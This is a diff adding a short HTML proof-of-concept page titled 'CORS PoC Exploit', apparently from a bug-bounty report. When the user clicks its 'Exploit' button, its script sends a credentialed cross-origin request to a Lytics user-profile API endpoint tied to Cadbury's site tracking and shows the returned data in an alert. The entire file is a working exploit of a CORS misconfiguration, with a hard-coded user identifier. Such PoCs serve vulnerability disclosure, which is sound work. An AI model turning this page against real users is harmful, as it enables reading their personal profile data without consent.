@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <script>
+         function cors() {
+            var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                        document.getElementById("emo").innerHTML = alert(this.responseText);
+            }
+         };
+         xhttp.open("GET", "https://api.lytics.io/api/me/7fa015f2a52bf2161597caa0826bd5d7/_uid/ac8e1ca744b72ed51440540c4de283a6?segments=true&mergestate=true&callback=window.lio.segmentscb&state=%7B%220%22%3A%22config%22%2C%221%22%3A%22DC-4898367%22%2C%22gtm.start%22%3A1587975532989%2C%22event%22%3A%22gtm.timer%22%2C%22gtm.uniqueEventId%22%3A2%2C%22OnetrustActiveGroups%22%3A%22%2C1%2C2%2C3%2C4%2C0_229170%2C0_242316%2C102%2C%22%2C%22OptanonActiveGroups%22%3A%22%2C1%2C2%2C3%2C4%2C0_229170%2C0_242316%2C102%2C%22%2C%22gtm.timerId%22%3A25%2C%22gtm.timerEventNumber%22%3A1%2C%22gtm.timerInterval%22%3A30000%2C%22gtm.timerLimit%22%3A1%2C%22gtm.timerStartTime%22%3A1587975534356%2C%22gtm.timerCurrentTime%22%3A1587975564358%2C%22gtm.timerElapsedTime%22%3A30002%2C%22gtm.triggers%22%3A%226068826_53%22%2C%22_ts%22%3A1587975777581%2C%22_nmob%22%3A%22t%22%2C%22_device%22%3A%22desktop%22%2C%22url%22%3A%22www.cadbury.co.uk%2F%22%2C%22_uid%22%3A%22ac8e1ca744b72ed51440540c4de283a6%22%2C%22_v%22%3A%222.0.0%22%2C%22_e%22%3A%22pv%22%2C%22_tz%22%3A5%2C%22_ul%22%3A%22en-US%22%2C%22_sz%22%3A%221366x768%22%2C%22_ca%22%3A%22jstag1%22%7D&ts=1587975777584", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+      <center>
+      <h2>CORS PoC Exploit </h2>
+      <h3>created by <a href="https://twitter.com/Jarvis7717">@Jarvis</a></h3>
+      <h3>Show full content of page</h3>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+      </div>
+   </body>
+</html>
